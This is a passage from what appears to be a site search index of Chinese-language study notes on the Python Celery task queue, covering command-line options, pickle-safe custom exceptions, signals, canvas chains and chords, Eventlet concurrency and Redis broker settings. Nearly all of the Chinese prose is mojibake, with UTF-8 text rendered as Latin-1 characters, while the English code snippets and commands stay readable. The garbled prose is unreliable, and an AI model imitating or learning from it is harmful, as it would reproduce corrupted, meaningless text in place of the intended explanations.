ä¸ç¡®å®šæ˜¯æ¯æ¬¡ä»»åŠ¡å‘¨æœŸçš„é—´éš”(å¤šä¸ªä»»åŠ¡éƒ½æ‰§è¡Œå®Œæˆä¸€æ¬¡, ç»„æˆä¸€ä¸ªä»»åŠ¡å‘¨æœŸ), è¿˜æ˜¯æ¯ä¸ªä»»åŠ¡ä¹‹é—´çš„é—´éš”. åº”æ˜¯åè€…. -l , --loglevel <[DEBUG|INFO|WARNING|ERROR|CRITICAL|FATAL]> æ—¥å¿—ç­‰çº§ å®ˆæŠ¤çº¿ç¨‹æ‰§è¡Œé€‰é¡¹ Daemonization Options: -f , --logfile TEXT æ—¥å¿—æ–‡ä»¶å --pidfile TEXT pidæ–‡ä»¶å --uid TEXT uid --gid TEXT gid --umask TEXT åˆ›å»ºæ–‡ä»¶çš„umaskå€¼ --executable TEXT ä¸çŸ¥é“... status ç”¨æ³•: celery status [OPTIONS] æŸ¥çœ‹åœ¨çº¿çš„ Worker èŠ‚ç‚¹. è¿œç¨‹æ§åˆ¶é€‰é¡¹ Remote Control Options: -t , --timeout FLOAT è®¾ç½®æ£€æŸ¥è¶…æ—¶æ—¶é—´. -d , --destination <COMMA SEPARATED LIST> æ£€æŸ¥çš„ç›®æ ‡èŠ‚ç‚¹åˆ—è¡¨. é€—å·åˆ†éš”. -j , --json ä½¿ç”¨jsonæ ¼å¼è¾“å‡º. graph ç”¨æ³•: celery graph [OPTIONS] COMMAND [ARGS]... å›¾å½¢åŒ–æ˜¾ç¤º? å®é™…ä½¿ç”¨æ•ˆæœæ˜¯jsonæ ¼å¼çš„ç›¸å…³è¾“å‡ºä¿¡æ¯. å‘½ä»¤: bootsteps æ˜¾ç¤ºå¼•å¯¼æ­¥éª¤å›¾. workers æ˜¾ç¤º workers graph. ä¾‹: celery --config src.time_schedule.celery_conf graph workers call ä½¿ç”¨: celery call [OPTIONS] NAME æ ¹æ®ä»»åŠ¡åè°ƒç”¨ä»»åŠ¡. è°ƒç”¨é€‰é¡¹ Calling Options: -a , --args <JSON ARRAY> ä½ç½®å‚æ•°. -k , --kwargs <JSON OBJECT> å…³é”®å­—å‚æ•°å­—å…¸. --eta ISO-86091 æ‰§è¡Œæ—¶é—´. --countdown FLOAT eta in seconds from now. --expires <ISO-86091 OR FLOAT> è¿‡æœŸæ—¶é—´. --serializer TEXT ä»»åŠ¡åºåˆ—åŒ–æ–¹å¼. è·¯ç”±é€‰é¡¹ Routing Options: --queue TEXT è‡ªå®šä¹‰é˜Ÿåˆ—å. --exchange TEXT è‡ªå®šä¹‰äº¤æ¢æœºå. --routing-key TEXT è·¯ç”±key. ä¾‹: celery -A src.time_schedule call -a '[2, 2]' src.time_schedule.pre_tasks.add 7506ef60-5621-460a-8219-7a97f6e96f4e å…¬å…±é€‰é¡¹ --help Show this message and exit. ä¸€äº›å¸¸ç”¨å‘½ä»¤ è®¾ç½®å¹¶å‘æ•° worker -c è®¾ç½®å¹¶å‘æ•°, é»˜è®¤æ•°ä¸ºcpuæ•°: -c, --concurrency <concurrency> Number of child processes processing the queue. The default is the number of CPUs available on your system. è®¾ç½®æ—¥å¿—çº§åˆ« worker -l è®¾ç½®æ—¥å¿—ä¿¡æ¯: -l, --loglevel [DEBUG|INFO|WARNING|ERROR|CRITICAL|FATAL] Logging level. åå°è¿è¡Œ celery multi åå°è¿è¡Œ, ä½†æ˜¯çœ‹æ–°ç‰ˆæœ¬æŒ‡ä»¤å¸®åŠ©ä¿¡æ¯è²Œä¼¼åˆä¸æ”¯æŒ: celery multi --help Usage: celery multi [OPTIONS] Start multiple worker instances. Options: --help Show this message and exit. å¯åŠ¨: celery multi start w1 -A proj -l info é‡å¯: celery multi restart w1 -A proj -l info åœæ­¢è¿è¡Œ: $ celery multi stop w1 -A proj -l info stop å‘½ä»¤æ˜¯å¼‚æ­¥çš„ï¼Œæ‰€ä»¥ä¸ä¼šç­‰å¾…èŒç¨‹ï¼ˆWorkerï¼‰å…³é—­ã€‚å¯ä»¥é€šè¿‡ stopwait å‘½ä»¤è¿›è¡Œåœæ­¢è¿è¡Œï¼Œå¯ä»¥ä¿è¯åœ¨é€€å‡ºä¹‹å‰å®Œæˆå½“å‰æ­£åœ¨æ‰§è¡Œçš„ä»»åŠ¡: $ celery multi stopwait w1 -A proj -l info é»˜è®¤æƒ…å†µä¸‹ä¼šåœ¨å½“å‰ç›®å½•ä¸­åˆ›å»ºpidæ–‡ä»¶å’Œæ—¥å¿—æ–‡ä»¶ï¼Œä¸ºé˜²æ­¢å¤šä¸ªèŒç¨‹ï¼ˆWorkerï¼‰å¹²æ‰°ï¼Œå»ºè®®å°†è¿™äº›æ–‡ä»¶å­˜æ”¾åœ¨ä¸“é—¨çš„ç›®å½•ä¸­: $ mkdir -p /var/run/celery $ mkdir -p /var/log/celery $ celery multi start w1 -A proj -l info --pidfile=/var/run/celery/%n.pid \\ --logfile=/var/log/celery/%n%I.log ä¹Ÿå¯ä»¥ä½¿ç”¨ multi å‘½ä»¤å¯åŠ¨å¤šä¸ªèŒç¨‹ï¼ˆWorkerï¼‰ï¼Œæœ‰ä¸€ä¸ªå¼ºå¤§çš„è¯­æ³•ä¸ºä¸åŒèŒç¨‹ï¼ˆWorkerï¼‰è®¾ç½®ä¸åŒçš„å‚æ•°: $ celery multi start 10 -A proj -l info -Q:1-3 images,video -Q:4,5 data \\ -Q default -L:4,5 debug","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-Command-line-tool.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-Command-line-tool.html"},{"title":"è‡ªå®šä¹‰å¼‚å¸¸","text":"Python çš„å¼‚å¸¸å¿…é¡»è¦ç¬¦åˆä¸€äº›ç®€å•è§„åˆ™ï¼Œæ‰èƒ½è¢« pickle æ¨¡å—æ”¯æŒä»¥åŠåºåˆ—åŒ–ã€‚ ä½¿ç”¨ Pickle ä½œä¸ºåºåˆ—åŒ–å™¨æ—¶ï¼Œå¼•å‘ä¸å¯æ‹¾å–å¼‚å¸¸çš„ä»»åŠ¡å°†æ— æ³•æ­£å¸¸å·¥ä½œã€‚ ä¸ºç¡®ä¿å¼‚å¸¸æ˜¯å¯è¢«å¤„ç†çš„ï¼Œå¼‚å¸¸å¿…é¡»è¦åœ¨ .args å±æ€§ä¸­æä¾›åˆå§‹åŒ–çš„å‚æ•°ã€‚æœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯ä½¿ç”¨å¼‚å¸¸è°ƒç”¨ Exception.__init__ è®©æˆ‘ä»¬æ¥çœ‹ä¸€äº›æœ‰ç”¨çš„ä¾‹å­ï¼Œè¿˜æœ‰ä¸€ä¸ªä¸é€‚ç”¨çš„ä¾‹å­: # OK: class HttpError(Exception): pass # BAD: class HttpError(Exception): def __init__(self, status_code): self.status_code = status_code # OK: class HttpError(Exception): def __init__(self, status_code): self.status_code = status_code Exception.__init__(self, status_code) # <-- REQUIRED æ‰€ä»¥è§„åˆ™æ˜¯ï¼šå¯¹äºä»»ä½•æ”¯æŒè‡ªå®šä¹‰å‚æ•° *args çš„å¼‚å¸¸ï¼Œéƒ½å¿…é¡»ä½¿ç”¨ Exception.__init__(self, *args) å…³é”®å­—å‚æ•°æ²¡æœ‰ç‰¹æ®Šæ”¯æŒï¼Œå¦‚æœéœ€è¦ä¿å­˜å…³é”®å­—å‚æ•°ï¼Œå½“å¼‚å¸¸è¢« unpickled æ—¶ï¼Œéœ€è¦å°†å®ƒä»¬ä½œä¸ºæ™®é€šçš„å‚æ•°è¿›è¡Œä¼ é€’: class HttpError(Exception): def __init__(self, status_code, headers=None, body=None): self.status_code = status_code self.headers = headers self.body = body super(HttpError, self).__init__(status_code, headers, body)","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-Exception.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-Exception.html"},{"title":"ä¿¡å·","text":"å½“æŸäº›åŠ¨ä½œåœ¨åº”ç”¨ä¸­çš„å…¶ä»–ä½ç½®è§¦å‘æ—¶ï¼Œä¿¡å·å…è®¸è§£è€¦çš„åº”ç”¨æ¥æ”¶åˆ°é€šçŸ¥ã€‚ Celery é™„å¸¦äº†å¾ˆå¤šä¿¡å·ï¼Œæ‚¨çš„åº”ç”¨å¯ä»¥åµŒå…¥è¿™äº›ä¿¡å·æ¥å¢åŠ æŸäº›åŠ¨ä½œçš„é¢å¤–è¡Œä¸ºã€‚ åŸºæœ¬ ä¸€äº›äº‹ä»¶è§¦å‘ä¿¡å·ï¼Œä½ å¯ä»¥è¿æ¥åˆ°è¿™äº›ä¿¡å·ä»¥åœ¨å®ƒä»¬è¢«è§¦å‘æ—¶æ‰§è¡Œä¸€äº›æ“ä½œã€‚ è¿æ¥åˆ° after_task_publish ä¿¡å·çš„ç¤ºä¾‹: from celery.signals import after_task_publish @after_task_publish.connect def task_sent_handler(sender=None, headers=None, body=None, **kwargs): # ä»»åŠ¡çš„ä¿¡æ¯ä½äºä»»åŠ¡ä¿¡æ¯çš„æ ‡é¢˜ä¸­ # ä½¿ç”¨ç¬¬äºŒç‰ˆçš„ä»»åŠ¡åè®®. info = headers if 'task' in headers else body print('after_task_publish for task id {info[id]}'.format( info=info, )) ä¸€äº›ä¿¡å·ä¹Ÿæœ‰ä¸€ä¸ªä½ å¯ä»¥è¿›è¡Œè¿‡æ»¤çš„å‘é€è€…ã€‚ æ¯”å¦‚ after_task_publish ä¿¡å·ä½¿ç”¨ä»»åŠ¡çš„åç§°ä½œä¸ºå‘é€è€…ï¼Œæ‰€ä»¥é€šè¿‡æä¾›å‘é€è€…çš„å‚æ•°è¿›è¡Œè¿æ¥ï¼Œä½ å¯ä»¥åœ¨æ¯æ¬¡åç§°ä¸º proj.tasks.add çš„ä»»åŠ¡è¢«å‘å¸ƒæ—¶è¿æ¥è¦è¢«è°ƒç”¨çš„å¤„ç†å‡½æ•°: @after_task_publish.connect(sender='proj.tasks.add') def task_sent_handler(sender=None, headers=None, body=None, **kwargs): # information about task are located in headers for task messages # using the task protocol version 2. info = headers if 'task' in headers else body print('after_task_publish for task id {info[id]}'.format( info=info, )) ä¿¡å·ä½¿ç”¨ä¸ django.core.dispatch ç›¸åŒçš„å®ç°ï¼Œæ‰€ä»¥åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œå…¶ä»–çš„å…³é”®å­—å‚æ•°(å¦‚ singal) å°†è¢«ä¼ é€’åˆ°æ‰€æœ‰çš„ä¿¡å·å¤„ç†å‡½æ•°é‡Œã€‚ ä¿¡å·å¤„ç†çš„æœ€ä½³å®è·µæ˜¯æ¥å—ä»»æ„çš„å…³é”®å­—å‚æ•°(å¦‚, **kwargs)ã€‚è¿™ç§æ–¹å¼ä½¿å¾—æ–°çš„ Celery ç‰ˆæœ¬å¯ä»¥åœ¨ä¸å½±å“ç”¨æˆ·ä»£ç çš„æƒ…å†µä¸‹æ·»åŠ å¯é€‰å‚æ•°ã€‚ ä»»åŠ¡ä¿¡å· before_task_publish åœ¨ 3.1 ç‰ˆæœ¬å¼•å…¥ åœ¨ä»»åŠ¡å‘å¸ƒä¹‹å‰æ´¾å‘ã€‚æ³¨æ„ï¼Œè¿™æ˜¯åœ¨å‘é€ä»»åŠ¡çš„è¿‡ç¨‹ä¸­æ‰§è¡Œçš„ã€‚ å‘é€è€…æ—¶è¢«å‘å¸ƒçš„ä»»åŠ¡çš„åç§°ã€‚ æä¾›çš„å‚æ•°: body ä»»åŠ¡æ¶ˆæ¯ä½“ è¿™æ˜¯ä¸€ä¸ªåŒ…å«ä»»åŠ¡æ¶ˆæ¯å­—æ®µçš„æ˜ å°„ï¼Œæœ‰å…³å®šä¹‰çš„å¯èƒ½å­—æ®µçš„å‚è€ƒï¼Œè¯·å‚é˜… Version 2 å’Œ Version 1ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-Signal.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-Signal.html"},{"title":"canvas","text":"celery çš„ canvas åº”å½“å€¼å¾—æ˜¯ä¸€ç§è®¾è®¡æµç¨‹, ç›®å‰ä¸æ˜¯å¾ˆç†è§£. ç­¾å æœ‰æ—¶å€™å¯èƒ½å¸Œæœ›å°†ä»»åŠ¡è°ƒç”¨çš„ç­¾åä¼ é€’ç»™å¦å¤–ä¸€ä¸ªè¿›ç¨‹æˆ–å…¶ä»–å‡½æ•°çš„å‚æ•°ï¼ŒCelery æä¾›äº†ç­¾åã€‚ ç­¾åé€šè¿‡ä¸€ç§æ–¹å¼è¿›è¡Œå°è£…ä»»åŠ¡è°ƒç”¨çš„å‚æ•°ä»¥åŠæ‰§è¡Œé€‰é¡¹ï¼Œä¾¿äºä¼ é€’ç»™ä»–çš„å‡½æ•°ï¼Œç”šè‡³é€šè¿‡åºåˆ—åŒ–é€šè¿‡ç½‘ç»œä¼ é€ã€‚ å¯ä»¥å°† add ä½¿ç”¨çš„å‚æ•°ä½œä¸ºä»»åŠ¡åˆ›å»ºçš„ç­¾åï¼Œå€’è®¡æ—¶ä¸º 10 ç§’ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼ˆ2,2ï¼‰: >>> add.signature((2, 2), countdown=10) tasks.add(2, 2) ä¹Ÿå¯ä»¥é€šè¿‡ä¸€ä¸ªå¿«æ·çš„æ–¹å¼è¿›è¡Œæ“ä½œ: >>> add.s(2, 2) tasks.add(2, 2) ç­¾åå®ä¾‹æ”¯æŒè°ƒç”¨APIï¼šè¿™å°±æ„å‘³ç€å¯ä»¥ä½¿ç”¨ delay å’Œ apply_async æ–¹æ³•ã€‚ ä½†åŒºåˆ«å°±åœ¨äºç­¾åå®ä¾‹å·²ç»æŒ‡å®šäº†å‚æ•°ç­¾åï¼Œè¯¥ add ä»»åŠ¡æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œéœ€è¦æŒ‡å®šä¸¤ä¸ªå‚æ•°çš„ç­¾åæ‰èƒ½å¤Ÿæˆä¸€ä¸ªå®Œæ•´çš„ç­¾åå®ä¾‹: >>> s1 = add.s(2, 2) >>> res = s1.delay() >>> res.get() 4 ä¹Ÿå¯ä»¥åˆ›å»ºä¸å®Œæ•´çš„ç­¾åæ¥è¿›è¡Œåˆ›å»º: # incomplete partial: add(?, 2) >>> s2 = add.s(2) ä¹Ÿå¯ä»¥è®¾ç½®æ–°çš„å‚å€¼ï¼Œæ–°è®¾ç½®çš„å‚æ•°ä¼šè¦†ç›–åŸæœ‰çš„å‚æ•°å€¼: >>> s3 = add.s(2, 2, debug=True) >>> s3.delay(debug=False) # debug is now False. ä¸å˜ç­¾å ä¸å˜æ€§(Immutability) éƒ¨åˆ†å‚æ•°é€šå¸¸åœ¨å›è°ƒä¸­ä½¿ç”¨ï¼Œçˆ¶ä»»åŠ¡çš„ç»“æœå°†ä¼šä½œä¸ºå‚æ•°ä¼ é€’ç»™é“¾æ¥æˆ–chordçš„å›è°ƒä»»åŠ¡ã€‚ æœ‰æ—¶ä½ å¸Œæœ›æŒ‡æ˜ä¸€ä¸ªä¸éœ€è¦å‚æ•°çš„å›è°ƒï¼Œè¿™æ—¶ä½ å¯ä»¥è®¾ç½®ç­¾åä¸ºä¸å˜çš„: >>> add.apply_async((2, 2), link=reset_buffers.signature(immutable=True)) å¿«æ·æ–¹å¼ .si() ä¹Ÿèƒ½åˆ›å»ºä¸å˜ç­¾å: >>> add.apply_async((2, 2), link=reset_buffers.si()) å¯¹äºä¸å˜ç­¾åï¼Œåªæœ‰æ‰§è¡Œé€‰é¡¹å¯ä»¥è¿›è¡Œè®¾ç½®ï¼Œå¹¶æ— æ³•ä½¿ç”¨éƒ¨åˆ†å‚æ•°å’Œå…³é”®è¯å‚æ•°ã€‚ å›è°ƒ ä»»åŠ¡å¯ä»¥ä½¿ç”¨ apply_async çš„ link å‚æ•°æ¥æ·»åŠ å›è°ƒ: add.apply_async((2, 2), link=other_task.s()) åªæœ‰å½“ä»»åŠ¡æˆåŠŸé€€å‡ºï¼Œå›è°ƒå‡½æ•°æ‰èƒ½è¢«æ‰§è¡Œï¼Œå¹¶ä¸”å°†çˆ¶ä»»åŠ¡çš„ç»“æœä½œä¸ºå‚æ•°ä¼ é€’ç»™å›è°ƒçš„ä»»åŠ¡ã€‚ å¦‚å‰æ‰€è¿°ï¼Œæ–°ä¼ é€’çš„å‚æ•°å°†ä¼šæ·»åŠ åœ¨ç­¾åæŒ‡å®šçš„å‚æ•°å‰ã€‚ å¦‚æœä½ æœ‰ä¸€ä¸ªç­¾å: >>> sig = add.s(10) æ¥ç€ sig.delay(result) å°†å˜ä¸º: >>> add.apply_async(args=(result, 10)) ç°åœ¨ï¼Œè®©æˆ‘ä»¬è°ƒç”¨ add ä»»åŠ¡ï¼Œå¹¶è®¾ç½®å›è°ƒ: >>> add.apply_async((2, 2), link=add.s(8)) æ­£å¦‚é¢„æœŸï¼Œé¦–å…ˆç¬¬ä¸€ä¸ªä»»åŠ¡å°†ä¼šè®¡ç®— 2 + 2ï¼Œæ¥ç€å›è°ƒä»»åŠ¡å°†ä¼šè®¡ç®— 4 + 8ã€‚ ç»„ ç»„ï¼šGroups ä¸€ä¸ª group å¹¶è¡Œè°ƒç”¨ä»»åŠ¡åˆ—è¡¨ï¼Œè¿”å›ä¸€ä¸ªç‰¹æ®Šçš„ç»“æœå®ä¾‹ï¼Œå¯ä»¥å°†ç»“æœä½œä¸ºä¸€ä¸ªåˆ—è¡¨è¿›è¡ŒæŸ¥çœ‹ï¼Œå¹¶ä¸”é€šè¿‡ç´¢å¼•è¿›å»è·å–è¿”å›å€¼: >>> from celery import group, add >>> group(add.s(i, i) for i in xrange(10))().get() [0, 2, 4, 6, 8, 10, 12, 14, 16, 18] Partial group: >>> g = group(add.s(i) for i in xrange(10)) >>> g(10).get() [10, 11, 12, 13, 14, 15, 16, 17, 18, 19] é“¾ é“¾ï¼šChains å¯ä»¥å°†ä»»åŠ¡é“¾æ¥åœ¨ä¸€èµ·ï¼Œåœ¨ä¸€ä¸ªäººè¿”å›åè¿›è¡Œè°ƒç”¨å¦å¤–ä¸€ä¸ªä»»åŠ¡: >>> from celery import chain >>> from proj.tasks import add, mul # (4 + 4) * 8 >>> chain(add.s(4, 4) | mul.s(8))().get() 64 æˆ– partial chain: >>> # (? + 4) * 8 >>> g = chain(add.s(4) | mul.s(8)) >>> g(4).get() 64 é“¾ä¹Ÿå¯ä»¥è¿™æ ·å†™: >>> (add.s(4, 4) | mul.s(8))().get() 64 å’Œå¼¦ å’Œå¼¦ï¼šChords å’Œå¼¦æ˜¯ä¸€ä¸ªå¸¦æœ‰å›è°ƒçš„ç»„: >>> from celery import chord >>> from proj.tasks import add, xsum >>> chord((add.s(i, i) for i in xrange(10)), xsum.s())().get() 90 é“¾æ¥åˆ°å…¶ä»–ä»»åŠ¡çš„ç»„å°†è‡ªåŠ¨è½¬æ¢ä¸ºå’Œå¼¦: >>> (group(add.s(i, i) for i in xrange(10)) | xsum.s())().get() 90 è¿™äº›åŸè¯­éƒ½æ˜¯ç­¾åçš„ç±»å‹ï¼Œå¯ä»¥æ ¹æ®éœ€è¦è¿›è¡Œç»„åˆï¼Œä¾‹å¦‚: >>> upload_document.s(file) | group(apply_filter.s() for filter in filters)","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-canvas.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-canvas.html"},{"title":"å¹¶å‘","text":"åŸºäº Eventlet çš„å¹¶å‘ Celery æ”¯æŒ Eventlet ä½œä¸ºå¯é€‰æ‰§è¡Œæ± çš„å®ç°ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹è¦ä¼˜äº prefork ã€‚ ä½†æ˜¯ä½ éœ€è¦ç¡®ä¿ä¸€é¡¹ä»»åŠ¡ä¸ä¼šå¤ªé•¿æ—¶é—´é˜»å¡äº‹ä»¶å¾ªç¯ã€‚ ä¸€èˆ¬æ¥è¯´ï¼Œä¸ CPU ç»‘å®šçš„æ“ä½œä¸é€‚ç”¨ä¸ Eventletã€‚ å¹¶ä¸”è¿˜è¦æ³¨æ„çš„æ˜¯ï¼Œä¸€äº›ç¬¬ä¸‰æ–¹çš„åº“ï¼Œé€šå¸¸æŒ‡å¸¦æœ‰Cæ‰©å±•çš„ï¼Œç”±äºæ— æ³•ä½¿ç”¨çŒ´å­è¡¥ä¸ï¼Œå› æ­¤ä¸èƒ½ä»ä½¿ç”¨ Eventet ä¸­è·å¾—ç›Šå¤„ã€‚ å¦‚æœä½ æ— æ³•ç¡®å®šï¼Œå¯ä»¥å‚è€ƒå®ƒä»¬çš„å®˜æ–¹æ–‡æ¡£ã€‚ å¦‚ pylibmc ä¸å…è®¸äº Eventlet ä¸€èµ·ä½¿ ç”¨ï¼Œä½†æ˜¯ psycopg2 å¯ä»¥ï¼Œè™½ç„¶å®ƒä»¬éƒ½æ˜¯å¸¦æœ‰ C æ‰©å±•çš„åº“ã€‚ prefork æ± æ˜¯åˆ©ç”¨å¤šè¿›ç¨‹ï¼Œä½†æ˜¯æ•°é‡å—é™äºæ¯ä¸ª CPU åªèƒ½æœ‰å‡ ä¸ªè¿›ç¨‹ã€‚ ä½¿ç”¨ Eventletï¼Œæ‚¨å¯ä»¥æœ‰æ•ˆåœ°äº§ç”Ÿæ•°ç™¾æˆ–è€…æ•°åƒä¸ªç»¿è‰²çº¿ç¨‹ã€‚ åœ¨ä¸€ä¸ªåŠ¨æ€ä¸­è½¬ç³»ç»Ÿçš„éæ­£å¼æµ‹è¯•ä¸­ï¼ŒEventlet æ± å¯ä»¥æ¯ç§’è·å–å¹¶å¤„ç†æ•°ç™¾ä¸ªåŠ¨æ€ï¼Œè€Œ prefork æ± å¤„ç† 100 æ¡åŠ¨æ€èŠ±è´¹äº†14ç§’ä¹‹å¤šã€‚ ä½†è¯·æ³¨æ„ï¼Œè¿™æ˜¯ å¼‚æ­¥ I/O çš„ä¼˜åŠ¿æ‰€åœ¨(å¼‚æ­¥çš„HTTPè¯·æ±‚)ã€‚ æ‚¨ä¹Ÿè®¸éœ€è¦å°† Eventlet å’Œ prefork èŒç¨‹æ­é…ä½¿ç”¨ï¼Œå¹¶æ ¹æ®å…¼å®¹æ€§æˆ–è€…æœ€é€‚åˆå¤„ç†çš„è§’åº¦æ¥è·¯ç”±ä»»åŠ¡ã€‚ å¯ç”¨ Eventlet ä½ å¯ä»¥ä½¿ç”¨ Celery çš„èŒç¨‹å‚æ•° -P æ¥å¯ç”¨ Eventlet: $ celery -A proj worker -P eventlet -c 1000 ç¤ºä¾‹ æœ‰å…³ä½¿ç”¨ Eventlet æ”¯æŒçš„ç¤ºä¾‹ï¼Œè¯·å‚é˜… Celery å‘è¡Œç‰ˆæœ¬çš„ Eventlet ç¤ºä¾‹ æ–‡ä»¶å¤¹","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-concurrent.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-concurrent.html"},{"title":"åŸºäºredisçš„é…ç½®","text":"æ­¤å¤„åªä»‹ç»redisç›¸å…³é…ç½®, æ›´å¤šé…ç½®è§ /docs/åç«¯/python/pythonä¸‰æ–¹åº“/celery_more/conf_celery redisç›¸å…³é…ç½® é»˜è®¤ä½¿ç”¨çš„ rabbitmq, æ‰€ä»¥ç”¨ redis éœ€è¦å…ˆå®‰è£…ä»¥æ¥åº“(è‹¥æ²¡å®‰è£…): pip install celery[redis] ä»£ç é‡Œçš„é…ç½®: app.conf.broker_url = 'redis://localhost:6379/0' æ­¤urlæ ¼å¼ä¸º: redis://:password@hostname:port/db_number é»˜è®¤ä½¿ç”¨çš„æ˜¯ localhost çš„ 6379 ç«¯å£ä¸­ 0 æ•°æ®åº“ã€‚ï¼ˆ Redis é»˜è®¤æœ‰ 16 ä¸ªæ•°æ®åº“ï¼‰ å¯ä»¥é€šè¿‡ Uninx å¥—æ¥å­—è¿›è¡Œè¿æ¥ï¼ŒURl æ ¼å¼å¦‚ä¸‹: redis+socket:///path/to/redis.sock å¯ä»¥é€šè¿‡è®¾ç½® virtual_hostå‚æ•°æ·»åŠ åˆ°URLä¸Šè¿›è¡ŒæŒ‡å®šä½¿ç”¨æ—¶ Uninx å¥—æ¥å­—è¿æ¥çš„æ•°æ®åº“ç¼–å·: redis+socket:///path/to/redis.sock?virtual_host=db_number Celery ä¹Ÿå¯ä»¥è¿æ¥ Redis å“¨å…µä¹Ÿæ˜¯éå¸¸ç®€å•çš„: app.conf.broker_url = 'sentinel://localhost:26379;sentinel://localhost:26380;sentinel://localhost:26381' app.conf.broker_transport_options = {'master_name':'cluster1'}","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-conf_FOR_Redis.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-conf_FOR_Redis.html"},{"title":"é…ç½®","text":"æ”¯æŒçš„ä¸€ç§é…ç½®å½¢å¼: è¾“å…¥ç«¯ -> Broker è¾“å‡ºç«¯ -> ç»“æœåç«¯ æ”¯æŒçš„é…ç½® task_serializer , åºåˆ—åŒ–æ–¹å¼ result_serializer ç»“æœåç«¯çš„åºåˆ—åŒ–æ–¹å¼ timezone, æ—¶åŒº task_annotations, è¯¦ç»†æŒ‡å®šå¤šä¸ªä»»åŠ¡é…ç½®, å¦‚ ä»»åŠ¡é™é€Ÿ task_routes, è·¯ç”± broker_transport_options, å¯è§æ€§è¶…æ—¶ result_backend, ç»“æœåç«¯é…ç½®: è¿”å›ç»“æœ task_publish_retry, æ˜¯å¦å¤±è´¥é‡è¯•, é»˜è®¤ä¸º True task_publish_retry_policy, å¤±è´¥é‡è¯•ç­–ç•¥ task_compression, å‹ç¼© åºåˆ—åŒ–æ–¹å¼ task_serializer, é»˜è®¤ä¸ºjson åœ¨å®¢æˆ·ç«¯å’Œå·¥ä½œäººå‘˜ä¹‹é—´ä¼ è¾“çš„æ•°æ®éœ€è¦è¿›è¡Œåºåˆ—åŒ–ï¼Œ å› æ­¤ Celery ä¸­çš„æ¯æ¡æ¶ˆæ¯éƒ½æœ‰ä¸€ä¸ª content_type æ ‡å¤´ï¼Œ è¯¥æ ‡å¤´æè¿°äº†ç”¨äºå¯¹å…¶è¿›è¡Œç¼–ç çš„åºåˆ—åŒ–æ–¹æ³•ã€‚ é»˜è®¤çš„åºåˆ—åŒ–å™¨æ˜¯JSONï¼Œä½†æ˜¯æ‚¨å¯ä»¥ä½¿ç”¨ task_serializer è®¾ç½®æ›´æ”¹æ­¤è®¾ç½®ï¼Œæˆ–è€…é’ˆå¯¹æ¯ä¸ªä»»åŠ¡ï¼Œç”šè‡³é’ˆå¯¹æ¯æ¡æ¶ˆæ¯è¿›è¡Œæ›´æ”¹ã€‚ æœ‰å†…ç½®çš„æ”¯æŒJSONï¼Œpickleï¼ŒYAML å’Œmsgpack æ¯ä¸ªåºåˆ—åŒ–å™¨éƒ½æœ‰å…¶ä¼˜ç‚¹å’Œç¼ºç‚¹: json - JSON è¢«å¤§å¤šæ•°çš„ç¼–ç¨‹è¯­è¨€æ”¯æŒï¼Œå¹¶ä¸”ç°åœ¨æ˜¯ Python æ ‡å‡†çš„ä¸€éƒ¨åˆ†ï¼ˆè‡ª2.6å¼€å§‹ï¼‰ï¼Œ å¹¶ä¸”ç°ä»£ Python åº“ï¼ˆä¾‹å¦‚ simplejsonï¼‰å…·æœ‰éå¸¸å¿«çš„ json è§£æé€Ÿåº¦ã€‚ JSON çš„ç¼ºç‚¹æ˜¯ä¼šé™åˆ¶ä½ ä½¿ç”¨å¦‚ä¸‹çš„æ•°æ®ç±»å‹ï¼šå­—ç¬¦ä¸²ã€Unicodeã€å­—å…¸å’Œåˆ—è¡¨ã€‚å°æ•°å’Œæ—¥æœŸæ˜æ˜¾ç¼ºå¤±ã€‚ äºŒè¿›åˆ¶æ•°æ®ä½¿ç”¨ Base64 ç¼–ç è¿›è¡Œä¼ è¾“ï¼Œè¿™ä¸æ”¯æŒçº¯äºŒè¿›åˆ¶ä¼ è¾“çš„ç›¸æ¯”ï¼Œæ•°æ®ä¼ è¾“é‡å¢é•¿äº†34%ã€‚ ä½†å¦‚æœä½ çš„æ•°æ®æ»¡è¶³ä¸Šè¿°é™åˆ¶ï¼Œå¹¶ä¸”ä½ éœ€è¦è·¨è¯­è¨€æ”¯æŒï¼Œåˆ™ JSON å¯èƒ½æ˜¯ä½ çš„æœ€ä½³é€‰æ‹©ã€‚ æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚è§ http://json.org pickle - å¦‚æœä½ é™¤äº† Python å¤–ï¼Œå¹¶ä¸éœ€è¦æ”¯æŒå…¶ä»–è¯­è¨€ï¼Œ é‚£ä¹ˆä½¿ç”¨ pickle ç¼–ç å°†è®©ä½ è·å¾—å¯¹æ‰€æœ‰ Python å†…å»ºç±»å‹çš„æ”¯æŒï¼ˆç±»å®ä¾‹é™¤å¤–ï¼‰ã€‚ ç›¸æ¯” JSONï¼Œä½¿ç”¨ pickle åºåˆ—åŒ–çš„äºŒè¿›åˆ¶æ–‡ä»¶æ›´å°ï¼Œä¼ è¾“é€Ÿåº¦æ›´å¿«ã€‚ è¯·å‚é˜… pickle è·å¾—æ›´å¤šä¿¡æ¯ yaml - YAML å’Œ JSON æœ‰è®¸å¤šç›¸ä¼¼çš„ç‰¹å¾ï¼Œyaml æ”¯æŒåŒ…æ‹¬æ—¥æœŸã€é€’å½’å¼•ç”¨åœ¨å†…çš„æ›´å¤šæ•°æ®ç±»å‹ã€‚ ç„¶è€Œï¼ŒPython çš„ 